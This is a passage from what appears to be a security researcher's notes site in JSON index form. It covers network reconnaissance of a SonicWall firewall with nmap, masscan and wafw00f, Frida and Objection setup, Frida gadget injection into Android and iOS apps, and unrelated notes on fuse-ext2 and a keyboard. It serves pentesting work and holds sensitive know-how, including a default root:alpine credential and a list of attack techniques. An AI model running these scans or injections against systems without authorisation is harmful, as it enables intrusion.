        "content": "Reconned from the start to finish in a few sec \u0026hellip;\n‚îå‚îÄ‚îÄ(kali„âøkali)-[~] ‚îî‚îÄ$ ping x.x.x.x PING ??? 56(84) bytes of data. 64 bytes from ???: icmp_seq=1 ttl=52 time=64.4 ms 64 bytes from ???: icmp_seq=2 ttl=52 time=62.7 ms ^C --- ??? ping statistics --- 2 packets transmitted, 2 received, 0% packet loss, time 1002ms ‚îå‚îÄ‚îÄ(kali„âøkali)-[~] ‚îî‚îÄ$ host x.x.x.x % nslookup \u0026gt; set type=PTR \u0026gt; x.x.x.x Server:\t???\tAddress: ???\tNon-authoritative answer: ... % whois x.x.x.x (example.ba) TCP Port Scan (Active)\n% sudo nmap -sS x.x.x.x PORT STATE SERVICE 8089/tcp open unknown UDP Port Scan\n% sudo nmap -sU --top-ports=100 x.x.x.x PORT STATE SERVICE 9/udp open|filtered discard 67/udp open|filtered dhcps Using masscan for rate allowance\n% sudo masscan 80.101.121.42 -p0-65535 --rate Scanning 1 hosts [65536 ports/host] Discovered open port 4433/tcp on x.x.x.x OS Detection\n% sudo nmap -O x.x.x.x Port Service detection\n% sudo nmap -sV -sS x.x.x.x -p $PORT PORT STATE SERVICE VERSION $PORT/tcp open http FRITZ!Box TR-069 service Enumerate HTTP Paths via nmap\n$ nmap -n -p80,4433,8080,8089,9443 --script http-enum x.x.x.x PORT STATE SERVICE 80/tcp closed http 4433/tcp open vop 8080/tcp closed http-proxy 8089/tcp open unknown 9443/tcp closed tungsten-https Certificate identification\n% nmap -sV --script ssl-cert-intaddr $SONICWALL -Pn -p4433,8089,80,9443,443 ... PORT STATE SERVICE VERSION 80/tcp filtered http 443/tcp filtered https 4433/tcp open ssl/http SonicWALL firewall http config |_http-server-header: SonicWALL | ssl-cert-intaddr: | Subject commonName: | 192.168.168.168 | Issuer commonName: |_ 192.168.168.168 8089/tcp open http FRITZ!Box TR-069 service 9443/tcp filtered tungsten-https Service Info: Devices: firewall, broadband router Active DNS Enumeration from the $ISP:\n% amass intel -active -addr x.x.x.x Firewalk Evasion\n% sudo nmap --script=firewalk --traceroute x.x.x.x ... PORT STATE SERVICE Host script results: | firewalk: | HOP HOST PROTOCOL BLOCKED PORTS TRACEROUTE (using port 443/tcp) HOP RTT ADDRESS 1 ... vhost discovery\n$ nmap -p4433,8089,80,9443 --script=\u0026#34;+http-vhosts\u0026#34; $SONICWALL -Pn PORT STATE SERVICE ... wafw00f implementation\n% wafw00f https://x.x.x.x:4433 -a -v ______ / \\ ( W00f! ) \\ ____/ ,, __ 404 Hack Not Found |`-.__ / / __ __ /\u0026#34; _/ /_/ \\ \\ / / *===* / \\ \\_/ / 405 Not Allowed / )__// \\ / /| / /---` 403 Forbidden \\\\/` \\ | / _ \\ `\\ /_\\\\_ 502 Bad Gateway / / \\ \\ 500 Internal Error `_____``-` /_/ \\_\\ ~ WAFW00F : v2.1.0 ~ The Web Application Firewall Fingerprinting Toolkit [*] Checking https://??? [+] The site https://??? is behind SonicWall (Dell) WAF. Other Technqs\nPhineas\u0026rsquo; Phisher VPN exploit Manual SQL Injection via binary patch diffing of vuln/non-vuln version Bruteforce Attack (Rate Limiter, Bypass) VPN or Firewall Version Disclosure Known Exploits and CVE\u0026rsquo;s Potential SQLmap payload using pwnat to bypass NAT translation tables ", 
        "url": "\/firewall-engagements\/"
    },
    
    
    
    "\/frida\/": {
        
        "title": "Frida",
        "tags": [],
        "content": "Frida Internals frida-gum is a cross-platform instrumentation and introspection library written in C. This library is consumed by frida-core through its JavaScript bindings, GumJS. See official documentation for more details and possible providers. The following example shows how to use frida-gum for standalone injection; specifically via iOS dylib injection.\nPrototyping with Fermion Fermion is an electron application that wraps frida-node and monaco-editor. It offers a fully integrated environment to prototype, test and refine Frida scripts through a single UI. With the integration of Monaco come all the features you would expect from Visual Studio Code: Linting, IntelliSense, keybindings, etc. In addition, Fermion has a TypeScript language definition for the Frida API so it is easy to write Frida scripts.\nFrida Scripting It\u0026rsquo;s recommended to develop Frida scripts using TypeScript, which contains code auto-completion and instant type-checking feedback. The TypeScript is typically compiled to a final Javascript file agent.js.\n$ git clone https://github.com/oleavr/frida-agent-example.git my-new-script $ cd my-new-script/ $ npm install $ npm run watch $ frida -U -f com.durakiconsulting.com --no-pause -l _agent.js Scripts Directory\nFridaLib - iOS/android frida library for reversing Android/Windows Scripts - Random Frida scripts for Android and WinNT Frida Stalker Scripts Dictionary\nInterruptor - Human-friendly interrupts hook library based on Frida\u0026rsquo;s Stalker Tools of Trades vscode-frida is recommended if you are using VSCode ", 
        "url": "\/frida\/"
    },
    
    
    
    "\/frida-objection-tutorial\/": {
        
        "title": "Frida \u0026 Objection Tutorial",
        "tags": [],
        "content": "Android Tutorial Frida Setup Make sure to have Android Debugging interface running (adbd) on your testing device. For reference, read the adbd setup first and then continue here.\nInstall the Frida for Android:\n$ adb root # might be required $ adb push frida-server /data/local/tmp/ $ adb shell \u0026#34;chmod 755 /data/local/tmp/frida-server\u0026#34; $ adb shell \u0026#34;/data/local/tmp/frida-server \u0026amp;\u0026#34; Smoke test on Frida setup:\n$ adb devices -l $ frida-ps -U # PID NAME 1590 com.facebook.katana # 13194 com.facebook.katana:providers # 12326 com.facebook.orca # 13282 com.twitter.android ... adbd setup Change all SELinux permissions to Permissable Use SELinuxPermission Android application, which checks for getenforce on a system reboot In MagiskManager application, enable the ADB Root When device is rebooting, USB debugging will not work out of the box SSH to Android device, using OpenSSHD In SSH shell type the following: # =\u0026gt; On Android device (ssh) % su % whoami % adbd # =\u0026gt; On Attackers machine (duh) $ adb root $ adb shell (android) $ whoami # =\u0026gt; root iOS Tutorial Frida Setup iOS connected over Wi-FI, Windows/Host connected to the same Wi-Fi, Linux/Guest connected to the same Wi-Fi Establish SSH connection to the iPhone (ssh root@x.x.x.x -p $PORT) SSH Auth combo (default): root:alpine Initiate a frida-server with remote connection listener In iOS device, open the application In a new Terminal, connect to Frida server To create a new frida-server, first remove frida autoload script and start manually:\n# =\u0026gt; Unload iOS daemon $ launchctl unload -w /Library/LaunchDaemons/re.frida.server.plist # =\u0026gt; Start frida-server manually Testers-iPhone:/Applications root# frida-server -l x.x.x.x To establish a Frida REPL connection, use frida CLI:\nroot@kali:~# frida -H x.x.x.x -F ____ / _ | Frida 12.10.0 - A world-class dynamic instrumentation toolkit | (_| | \u0026gt; _ | Commands: /_/ |_| help -\u0026gt; Displays the help system . . . . object? -\u0026gt; Display information about \u0026#39;object\u0026#39; . . . . exit/quit -\u0026gt; Exit . . . . . . . . More info at https://www.frida.re/docs/home/ [Remote::AppName]-\u0026gt; Objection Setup First reference to Frida Setup to establish connection to the Frida server. Then use objection to investigate into the targeted application.\nroot@kali:~# objection -N -h 172.22.4.109 -g App explore Using networked device @`172.22.4.109:27042` Agent injected and responds ok! _ _ _ _ ___| |_|_|___ ___| |_|_|___ ___ | . | . | | -_| _| _| | . | | |___|___| |___|___|_| |_|___|_|_| |___|(object)inject(ion) v1.9.4 Runtime Mobile Exploration by: @leonjza from @sensepost [tab] for command suggestions x.xxxx.xxxxxxxx.xxxx on (iPhone: 13.3) [net] # Objection Usage\n$ env x.xxx.xxxxxxxxx.xxxx on (iPhone: 13.3) [net] # env\nName Path ----------------- ------------------------------------------------------------------------------------------- BundlePath /private/var/containers/Bundle/Application/DD6C2A3C-6CD3-44D0-9EAF-BC8EEE8C6702/App.app CachesDirectory /var/mobile/Containers/Data/Application/B26572F4-75BA-45C0-A6DE-40AEA275AF28/Library/Caches DocumentDirectory /var/mobile/Containers/Data/Application/B26572F4-75BA-45C0-A6DE-40AEA275AF28/Documents LibraryDirectory /var/mobile/Containers/Data/Application/B26572F4-75BA-45C0-A6DE-40AEA275AF28/Library References\nFrida and Objection Objection Mobile Exploration Frida and Objection via x64.sh Objection/Frida Guide ", 
        "url": "\/frida-objection-tutorial\/"
    },
    
    
    
    "\/frida-gadget-injection\/": {
        
        "title": "Frida Gadget Injection",
        "tags": [],
        "content": "This is quick description on how to inject Frida gadget into Smali directly without much overhead. Start by installing Frida and Objection and then continuing from here.\nFirst decompile the APK and check the AndroidManifest.xml file.\n$ more AndroidManifest.xml \u0026lt;application ...\u0026gt; \u0026lt;activity android:name=\u0026#34;xxx.activity.SplashActivity\u0026#34; android:noHistory=\u0026#34;true\u0026#34; android:screenOrientation=\u0026#34;portrait\u0026#34;\u0026gt; ... Write down the Activity name (such is SplashActivity). Must be somewhere on early start-up of application lifecycle. Open up the Activity in decompiled Smali object, and change the public constructor \u0026lt;init\u0026gt;(V) to include frida-gadget.\n$ vim xxx.activity.SplashActivity .class public Lcom/xxx/activity/SplashActivity; .source \u0026#34;SourceFile\u0026#34; # direct methods .method public constructor \u0026lt;init\u0026gt;()V .locals 0 .line 8 invoke-direct {p0}, Lcom/halcom/mobile/hybrid/activity/SplashActivity;-\u0026gt;\u0026lt;init\u0026gt;()V # =\u0026gt; injection point const-string v0, \u0026#34;frida-gadget\u0026#34; invoke-static {v0}, Ljava/lang/System;-\u0026gt;loadLibrary(Ljava/lang/String;)V return-void .end method Remember to inject this code in all of your public constructor \u0026lt;init\u0026gt;()V in Splash* activities. Move the application to your device and start it. Application has to handle libfrida-gadget.so correctly and load it at runtime. In Frida, it\u0026rsquo;s enought to type %resume in Frida REPL to continue execution after the injection.\n", 
        "url": "\/frida-gadget-injection\/"
    },
    
    
    
    "\/frida-gadget-injection-on-ios\/": {
        
        "title": "Frida Gadget Injection on iOS",
        "tags": [],
        "content": "Here, I will explain quickly how to patch IPA with Frida Gadget, usable for iOS, and iPadOS operating systems.\nProvision of Apple Certificate\nCreate a new Apple Developer Account (Free), or use Apple Paid Developer Account ($99) this works even if your Apple Device (iPhone, iPad) is not iCloud synced to newly created account Login to Apple Developer account in XCode via Preferences -\u0026gt; Account Create a blank iOS app., let it be Objective-C based, name it \u0026lsquo;MobileProvision\u0026rsquo; Go to Target -\u0026gt; MobileProvision, then select \u0026lsquo;Signing \u0026amp; Capabilities\u0026rsquo; Check \u0026lsquo;Automatically manage signing\u0026rsquo; Set \u0026lsquo;Bundle Identifier\u0026rsquo; to com.durakiconsulting.MobileProvision Set \u0026lsquo;Team\u0026rsquo; to reflect newly created Apple Developer Account Connect your iPhone device via Lightning Cable Select Application Target to the physical device Build and run the application This will create a new .mobileprovision Lookup local CodeSign Cert.\nVia Terminal, on your MacOS host, enter the following:\n$ security find-identity -v -p codesigning ... 6) C250ExxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxD3F \u0026#34;Apple Development: xxxxxxxxxx@gmail.com (4B3xxxxxx4)\u0026#34; As seen, the provision file will be displayed, which we will use later during the IPA patch procedure.\nUse Objection to patch an IPA file\nUsing objection you can patch the IPA file. First, install Objection, as well as patchipa command pre-requisits:\n# install applesign node package $ npm install -g applesign # install insert_dylib for injecting $ cd /tmp/ \u0026amp;\u0026amp; git clone https://github.com/Tyilo/insert_dylib \u0026amp;\u0026amp; cd insert_dylib \u0026amp;\u0026amp;xcodebuild \u0026amp;\u0026amp; cp build/Release/insert_dylib /usr/local/bin/insert_dylib Patching IPA\nTo patch an IPA file, use the command:\n$ objection patchipa --source /path/to/app.ipa -c CODESIGN_IDENTITY -b com.dummydcprovision.MobileProvision # where: # --source Original IPA File Path # -c Code Signing Certificate to use (ie. \u0026#39;4B3xxxxxx4\u0026#39;) # -b The bundleid to set when codesigning the IPA, must equal to Bundle Identifier as created during MobileProvision (see above) Such example can be seen below, disclosing actual usage:\n$ objection patchipa --source PROJECT/Workpapers/target.ipa -c 4B3xxxxxx4 -b com.dummydcprovision.MobileProvision # # Using latest Github gadget version: 16.0.2 # Patcher will be using Gadget version: 16.0.2 # No provision file specified, searching for one... # Found provision file $USER/Library/Developer/Xcode/DerivedData/MobileProvision-xxxxxxxxxxxxxxxxxxxxxxxxxxxx/Build/Products/Debug-iphoneos/# MobileProvision.app/embedded.mobileprovision # Found a valid provisioning profile # Setting bundleid to specified value: com.dummydcprovision.MobileProvision # Working with app: xxxxxxxxxxxxxxxxxxx-mobile.app # Bundle identifier is: com.xxxxxxxxxxx.app # Codesigning 1 .dylib\u0026#39;s with signature 4B3xxxxxx4 # Code signing: FridaGadget.dylib # Creating new archive with patched contents... # Codesigning patched IPA... # # Copying final ipa from /var/folders/1t/******************************/T/xxxxxxx-frida-codesigned.ipa to current directory... # Cleaning up temp files... Download Frida Gadget to your MacOS Host machine\nThis will allow Frida \u0026amp; Objection to connect to a jailed iOS, depending on the installation method, you will need to:\n# Create Frida cached directory $ mkdir -p $HOME/.cache/frida/ \u0026amp;\u0026amp; cd $HOME/.cache/frida/ # Download universal build of Frida Gadget for iOS, using the Objection gadget version $ wget https://github.com/frida/frida/releases/download/16.0.2/frida-gadget-16.0.2-ios-universal.dylib.gz # Unpack gzip archive $ gunzip frida-gadget-16.0.2-ios-universal.dylib.gz $ Rename the unzipped gz file $ mv frida-gadget-16.0.2-ios-universal.dylib gadget-ios.dylib Install the patched IPA and Inject to Process\nInstall the final IPA from MacOS Host to your device, using ideviceinstaller command-line utility installed earlier:\n$ ideviceinstaller -i target.ipa ... Install: InstallComplete (100%) Install: Complete To Attach via Frida or Objection, start the Application from the iPhone, and use:\nIt is expected for an injected App to hang on Splashscreen, or during application startup. This is due to injected dylib Frida Gadget, which will freeze until you attach to the running app.\n$ frida -U -N com.dummydcprovision.MobileProvision $ objection -g com.dummydcprovision.MobileProvision explore ", 
        "url": "\/frida-gadget-injection-on-ios\/"
    },
    
    
    
    "\/frida-trace-for-ios\/": {
        
        "title": "Frida Trace for iOS",
        "tags": [],
        "content": "You can imagine application as a black box that interacts with the outer world via inputs and outputs. Ordinary mobile application has specific threat model. Particularly, filesystem and network communication are pretty interesting interaction points which can give you a lot of useful information.\nUsing frida-discover to get some idea where to start\n$ frida-discover -U com.iosapp.example # libcommonCrypto.dylib # Calls Function # 15 sub_bec0 # 15 sub_bee4 # 8 sub_96f8 # 8 sub_befc # 3 CCDigest Using frida-trace to find NSURLSession tasks\n# via Simulator $ frida-trace -R Gadget -m \u0026#39;-[NSURLSession dataTaskWithURL:*]\u0026#39; # via Device $ frida-trace -U Gadget -m \u0026#39;-[NSURLSession dataTaskWithURL:*]\u0026#39; This will yield, something similar to:\nInstrumenting functions... -[NSURLSession dataTaskWithURL:completionHandler:]: Auto-generated handler at \u0026#34;/private/tmp/__handlers__/__NSURLSession_dataTaskWithURL_c_01cef27d.js\u0026#34; -[NSURLSession dataTaskWithURL:]: Auto-generated handler at \u0026#34;/private/tmp/__handlers__/__NSURLSession_dataTaskWithURL__.js\u0026#34; Started tracing 2 functions. Press Ctrl+C to stop. /* TID 0x303 */ 4206 ms -[NSURLSession dataTaskWithURL:0x6040002e3b80 completionHandler:0x604000447f80 ] ... ObjC wildcard tracing\n$ frida-trace -U -f com.iosapp.example -m \u0026#34;*[AppClassName *]\u0026#34; Tracing Swift mangled functions\n$ frida-trace -U -f com.iosapp.example -m \u0026#34;*[AppName.UserProfileMngr *]\u0026#34; Tracing C functions on iOS\n$ frida-trace -U -f com.iosapp.example -i \u0026#34;getaddrinfo\u0026#34; Trace entire Module not advised\n// avoid executing this. /* trace *.dylib */ $ frida-trace -U -f com.iosapp.example -I libsystem_c.dylib /* trace module name */ $ frida-trace -U -f com.iosapp.example -I UIKit Trace Files and HTTP/API connections\n$ frida-trace -U -f com.iosapp.example -m \u0026#34;-[NSURLRequest initWithURL:]\u0026#34; $ frida-trace -U -f com.iosapp.example -m \u0026#34;-[NSURL initWithString:]\u0026#34; $ frida-trace -U -f com.iosapp.example -m \u0026#34;*[NSURL absoluteString]\u0026#34; Using auto-generated Frida handler for System functions\n// Generate Frida handler $ frida-trace -U -f com.iosapp.example -i \u0026#34;*strcpy\u0026#34; # Instrumenting functions... # _platform_strcpy: Loaded handler at \u0026#34;/.../__handlers__/libSystem.B.dylib/_platform_strcpy.js\u0026#34; # Started tracing 1 function. Press Ctrl+C to stop. // Edit Frida handler $ vi _platform_strcpy.js // onEnter: function (log, args, state) { // // strcpy(dst, src); // console.log(\u0026#34;[*] _platform_strcpy()\u0026#34;); // var src_ptr = args[1].toString(); // var str_string = Memory.readCString(args[1]); // var src_byteary = Memory.readByteArray(args[1], 4); // var textDecoder = new TextDecoder(\u0026#34;utf-8\u0026#34;); // var decoded = textDecoder.decode(src_byteary); // // console.log(\u0026#39;[+] src_ptr\\t-\u0026gt; \u0026#39; , src_ptr); // console.log(\u0026#39;[+] src_string\\t-\u0026gt; \u0026#39; + src_string); // console.log(\u0026#39;[+] src_byteary\\t-\u0026gt; \u0026#39; + src_byteary); // console.log(\u0026#39;[+] src_byteary size\\t-\u0026gt; \u0026#39; + src_byteary.byteLength); // console.log(\u0026#39;[+] src_byteary decoded\\t-\u0026gt; \u0026#39; + decoded); // } Describe class members and their values, of each class instance\nObjC.choose(ObjC.classes[clazz], { onMatch: function (obj) { console.log(\u0026#39;onMatch: \u0026#39;, obj); Object.keys(obj.$ivars).forEach(function(v) { console.log(\u0026#39;\\t\u0026#39;, v, \u0026#39;=\u0026#39;, obj.$ivars[v]); }); }, onComplete: function () { console.log(\u0026#39;onComplete\u0026#39;, arguments.length); } }); Advanced observing and tracing via Frida Scripts\nThe following Frida Function will take ClassName as an input, and print all observations and recursive calls being executed in the traced method block. To use simply call observeClass('Someclass$innerClass'); from the Frida REPL, after injecting the script into target process.\n# observeClass(\u0026#39;Someclass$innerClass\u0026#39;); # ... # Observing Someclass$innerClass - func # Observing Someclass$innerClass - empty # (0x174670040,parameterName) Someclass$innerClass - func # 0x10048dd6c libfoo!0x3bdd6c # 0x1005a5dd0 libfoo!0x4d5dd0 # 0x1832151c0 libdispatch.dylib!_dispatch_client_callout # 0x183215fb4 libdispatch.dylib!dispatch_once_f # RET: 0xabcdef function observeClass(name) { var k = ObjC.classes[name]; k.$ownMethods.forEach(function(m) { var impl = k[m].implementation; console.log(\u0026#39;Observing \u0026#39; + name + \u0026#39; \u0026#39; + m); Interceptor.attach(impl, { onEnter: function(a) { this.log = []; this.log.push(\u0026#39;(\u0026#39; + a[0] + \u0026#39;,\u0026#39; + Memory.readUtf8String(a[1]) + \u0026#39;) \u0026#39; + name + \u0026#39; \u0026#39; + m); if (m.indexOf(\u0026#39;:\u0026#39;) !== -1) { var params = m.split(\u0026#39;:\u0026#39;); params[0] = params[0].split(\u0026#39; \u0026#39;)[1]; for (var i = 0; i \u0026lt; params.length - 1; i++) { try { this.log.push(params[i] + \u0026#39;: \u0026#39; + new ObjC.Object(a[2 + i]).toString()); } catch (e) { this.log.push(params[i] + \u0026#39;: \u0026#39; + a[2 + i].toString()); } } } this.log.push( Thread.backtrace(this.context, Backtracer.ACCURATE) .map(DebugSymbol.fromAddress) .join(\u0026#39;\\n\u0026#39;) ); }, onLeave: function(r) { try { this.log.push(\u0026#39;RET: \u0026#39; + new ObjC.Object(r).toString()); } catch (e) { this.log.push(\u0026#39;RET: \u0026#39; + r.toString()); } console.log(this.log.join(\u0026#39;\\n\u0026#39;) + \u0026#39;\\n\u0026#39;); } }); }); } ", 
        "url": "\/frida-trace-for-ios\/"
    },
    
    
    
    "\/fuse-ext2\/": {
        
        "title": "fuse-ext2",
        "tags": [],
        "content": "Compiling Manually Mounting via fuse-ext2 instead of ext4fuse. First install required dependencies:\n$ brew install caskroom/cask/osxfuse # =\u0026gt; be patient, it\u0026#39;s ~300MiB in size # it is possible that above \u0026#39;brew install\u0026#39; command will fail, threfore we will # continue compiling it on our own. The error message I\u0026#39;ve got from the brew command # is: # installer: Error - The FUSE for macOS installation package is not compatible with this version of macOS. # # if you get similar error message in the terminal output, continue from next line. $ brew install e2fsprogs m4 automake autoconf libtool # =\u0026gt; will install required libs to compile manually Clone fuse-ext2 repository somewhere in working directory and cd into it:\n$ git clone --depth=1 https://github.com/alperakcan/fuse-ext2.git Cloning into \u0026#39;fuse-ext2\u0026#39;... remote: Enumerating objects: 97, done. remote: Counting objects: 100% (97/97), done. ... $ cd fuse-ext2/ Lets generate installation and build script for our environments. Luckly, the fuse-ext2 project already contains auto generation script:\n$ ./autogen.sh Running autoreconf --verbose --install --force autoreconf: export WARNINGS= autoreconf: Entering directory \u0026#39;.\u0026#39; autoreconf: configure.ac: not using Gettext autoreconf: running: aclocal --force autoreconf: configure.ac: tracing autoreconf: running: glibtoolize --copy --force glibtoolize: putting auxiliary files in \u0026#39;.\u0026#39;. glibtoolize: copying file \u0026#39;./ltmain.sh\u0026#39; ... fuse-ext2/Makefile.am: installing \u0026#39;./depcomp\u0026#39; autoreconf: Leaving directory \u0026#39;.\u0026#39; Removing autom4te.cache If everything completed successfully, lets use generated ./configure script to prepare Makefile. Use the CFLAGS environment variable to point to our previously installed dependencies:\nCFLAGS=\u0026#34;-idirafter/$(brew --prefix e2fsprogs)/include -idirafter/usr/local/include/osxfuse\u0026#34; LDFLAGS=\u0026#34;-L$(brew --prefix e2fsprogs)/lib\u0026#34; ./configure checking build system type... x86_64-apple-darwin21.6.0 checking host system type... x86_64-apple-darwin21.6.0 checking target system type... x86_64-apple-darwin21.6.0 checking for a BSD-compatible install... /opt/local/bin/ginstall -c checking whether build environment is sane... yes ... config.status: executing depfiles commands config.status: executing libtool commands Now you just have to make, and make install to complete the manual compilation of fuse-ext2:\n$ make /Applications/Development/Xcode.app/Contents/Developer/usr/bin/make all-recursive Making all in fuse-ext2 gcc -DHAVE_CONFIG_H -I. -I.. -Wall ... [REDACTED] .getxattr = op_getxattr, ^~~~~~~~~~~ ... ** BUILD SUCCEEDED ** make[3]: Nothing to be done for `all-am\u0026#39;. make[2]: Nothing to be done for `all-am\u0026#39;. To install newly created fuse-ext2 binaries, issue this command in the project directory:\n$ sudo make install /opt/local/bin/gmkdir -p \u0026#39;/usr/local/bin\u0026#39; /bin/sh ../libtool --mode=install /opt/local/bin/ginstall -c fuse-ext2 fuse-ext2.probe fuse-ext2.wait fuse-ext2.install fuse-ext2.uninstall \u0026#39;/usr/local/bin\u0026#39; libtool: install: /opt/local/bin/ginstall -c fuse-ext2 /usr/local/bin/fuse-ext2 /opt/local/bin/ginstall -c -d \u0026#34;//usr/local/sbin\u0026#34; ... The following command will be used to forcefully enable fuse-ext2 write access:\n$ sudo sed -e \u0026#39;s/OPTIONS=\u0026#34;local,allow_other\u0026#34;/OPTIONS=\u0026#34;local,allow_other,rw+\u0026#34;/\u0026#39; -i.orig /Library/Filesystems/fuse-ext2.fs/fuse-ext2.util Usage Now after you have everything ready and installed, lets continue with ext4fuse. The ext4fuse is required for fuse-ext2 FileSystem, in case you want to be able to read ext4 partitions (such is GNU/Linux partition). Install ext4fuse from the Homebrew packages, or manually compile cask as described here.\n$ brew install ext4fuse $ sudo dscl . append /Groups/operator GroupMembership `whoami` # =\u0026gt; make sure to add user to operator group Insert your SD Card (ie. RaspbianOS), and show available disks using diskutility:\n$ sudo diskutil list ... /dev/disk2 (external, physical): #: TYPE NAME SIZE IDENTIFIER 0: FDisk_partition_scheme *31.9 GB disk2 1: Linux 5.2 GB disk2s1 (free space) 26.7 GB - Unmount the Disk so we can mount partition:\n$ sudo diskutil unmountDisk /dev/disk2 Finally create a new mount directory, and mount the ext4 partition:\n$ sudo mkdir /Volumes/Linux $ sudo fuse-ext2 /dev/disk2s1 /Volumes/Linux -o rw+ After you finish changing/editing/viewing the ext4 partition, make sure to always unmount the partition from the filesystem:\n$ sudo umount /Volumes/Linux ", 
        "url": "\/fuse-ext2\/"
    },
    
    
    
    "\/generate-frida-class\/": {
        
        "title": "Generate Frida Class",
        "tags": [],
        "content": "This explains usage of toolchain for generating JSON definitions for Objective-C classes, commonly used during Frida hooking.\ntodo: fork macschema and extend it to support custom classes The macschema tool has several subcommands for downloading topics from Apple documentation and parsing topics into schemas. The commands will assume they can use two directories in the working directory: api and doc, where schemas and topics are downloaded and saved as JSON.\nTo pull and show a schema, which will download relevant topics and parse into schema:\n$ macschema pull appkit/nswindow --show Other commands:\n$ macschema Generates JSON definitions for Apple APIs Usage: macschema [command] Available Commands: crawl Downloads topics linked from a topic to doc dir fetch Download a topic to doc dir help Help about any command pull Generate a schema in api dir fetching topics if needed Flags: -h, --help help for macschema --lang string use language (default \u0026#34;objc\u0026#34;) --show show resulting JSON to stdout -v, --version version for macschema Use \u0026#34;macschema [command] --help\u0026#34; for more information about a command. You can dump Objective-C messages in a tree-style format using objtree package. It will trace all ObjC methods within the scope of a method or function (symbolicated or by relative address). Stack-depth can be filtered by preference choice via command-line arguments. It includes all frida-trace goodies: spawn or attach to pid, connect remotely via frida-server, etc.\nExample:\n$ objtree \u0026lt;some_process\u0026gt; -m \u0026#34;-[InterestingClass interestingMethod:withArg:]\u0026#34; $ objtree \u0026lt;some_process\u0026gt; -i LibFoo!bar $ objtree \u0026lt;some_process\u0026gt; -i generate_interesting_value -L 6 # =\u0026gt; match the function name in all modules $ objtree \u0026lt;some_process\u0026gt; -a \u0026lt;offset\u0026gt; # offset is target method relative offset to \u0026#39;process\u0026#39; base address Usage:\n$ objtree Usage: objtree [options] target Options: --version show program\u0026#39;s version number and exit -h, --help show this help message and exit -D ID, --device=ID connect to device with the given ID -U, --usb connect to USB device -R, --remote connect to remote frida-server -H HOST, --host=HOST connect to remote frida-server on HOST -f FILE, --file=FILE spawn FILE -F, --attach-frontmost attach to frontmost application -n NAME, --attach-name=NAME attach to NAME -p PID, --attach-pid=PID attach to PID --stdio=inherit|pipe stdio behavior when spawning (defaults to ‚Äúinherit‚Äù) --aux=option set aux option when spawning, such as ‚Äúuid=(int)42‚Äù (supported types are: string, bool, int) --runtime=qjs|v8 script runtime to use --debug enable the Node.js compatible script debugger --squelch-crash if enabled, will not dump crash report to console -O FILE, --options-file=FILE text file containing additional command line options -m OBJC_METHOD include OBJC_METHOD -i FUNCTION include FUNCTION -a FUNCTION_OFFSET add FUNCTION_OFFSET, relative to binary base -L STACK_DEPTH trace functions up to STACK_DEPTH, default is 8 -o OUTPUT, --output=OUTPUT dump output to file OUTPUT This part of the notes explains how to use cycript to expose private enums by using native NSStringFrom* functions. Enums are typically reverse engineered by monitoring side effects of values. Understanding what this values really are, can help developers write better, more maintainable code. Credits for the trick goes to leptos-null/PrivateEnums.\nInstructions:\n# =\u0026gt; dumps a list of all NSStringFrom* functions, some parts of dumped data are type(struct), not type(enum) $ grep \u0026#34;NSStringFrom\u0026#34; $THEOS/sdks/iPhoneOS10.2.sdk/System/Library/*Frameworks/*.framework/*.tbd # =\u0026gt; open the iPhoneOS simulator in Hopper and check that the extracted function # is for a fixed point numerical value, and not a struct $ hoppv5 /Library/XCode/Simulator/\u0026lt;IPHONE_SIMULATOR_BINARY\u0026gt; # =\u0026gt; on the iOS device, use cycript to call the function. Compare the cycript # output with Hopper disassembly, and ensure all classes have been exhausted References\nmacschema brew install progrium/taps/macschema ", 
        "url": "\/generate-frida-class\/"
    },
    
    
    
    "\/ghidra-and-related\/": {
        
        "title": "Ghidra and Related",
        "tags": [],
        "content": "Installation Clone the repository or download and extract somewhere. In Ghidra, open the Script Manager (Window -\u0026gt; Script Manager) click the Script Directory button and add $REPO/scripts to the list.\nOnce the script directory is added to Ghidra you can find the scripts in the Script Manager. You can run the scripts directly from the Script Manager in Ghidra. Additionally, imported scripts can also have Menus entry, and assigned keyboard shortcuts for ease of use. In order to activate the menus and shortcuts, you must click the In Tool checkbox next to the scripts you wish to integrate into Ghidra UI.\nFavorite Scripts [] Favorite Plugins coloring_call_jmp.py py-findcrypt-ghidra binwalk.py yara.py swift_demangler.py golang_renamer.py ghidra-fidb-repo replace-constants annotate-syscalls goto-main operator analyzeocmsgsend.py fox rhabdomancer.java ghidra_stack_strings Additionally, there is ghidra-snippets repository that may be usable as a reference to various Ghidra functions and their signatures.\n", 
        "url": "\/ghidra-and-related\/"
    },
    
    
    
    "\/gmmk-60-keyboard\/": {
        
        "title": "GMMK 60% Keyboard",
        "tags": [],
        "content": "General Shortcuts, LED Shortcuts\nGeneral Shortcuts Shortcut Function Fn+W Adjust keyboard\u0026rsquo;s LED backlight brightness Fn+S Adjust keyboard\u0026rsquo;s LED backlight brightness Fn+Z Adjust LED backlight direction Fn+X Cycle through various backlight RGB colors Fn+A Adjust RGB LED light speed during animations Fn+D Adjust RGB LED light speed during animations Fn+R Press for 10 seconds to reset keyboard to factory default settings Fn+Win Enable / Disable Windows key Fn+Caps Lock Swap functions of Fn and Caps Lock. Press again to revert Fn+Tab Turn off all LED lights on the keyboard Fn+Esc ` Fn+1 F1 Fn+N F(n) Fn+0 F9 Fn+- F11 Fn++ F12 Fn+Shift+Esc ~ Fn+O Page Down Fn+U Page Up Fn+P Print Screen Fn+[ Scroll Lock Fn+] Pause Fn+J Left arrow Fn+K Down arrow Fn+L Right arrow Fn+I Up arrow Fn+; Insert Fn+' Delete Fn+N Home Fn+M End Fn+, Mute Volume Fn+. Decrease Volume Fn+/ Increase Volume LED Shortcuts note you can use up to 3 variations per effect type\nShortcut Effect Type Effect Count Fn+F Breath Effect x3 Fn+G Touch Effect x3 Fn+V K-Effect x3 Fn+C Wave #1 x3 Fn+B Wave #2 x3 Fn+H Drawing x3 ", 
        "url": "\/gmmk-60-keyboard\/"
    },
    
    
    
    "\/hall-effect-sensors\/": {
        
        "title": "Hall Effect Sensors",
        "tags": [],
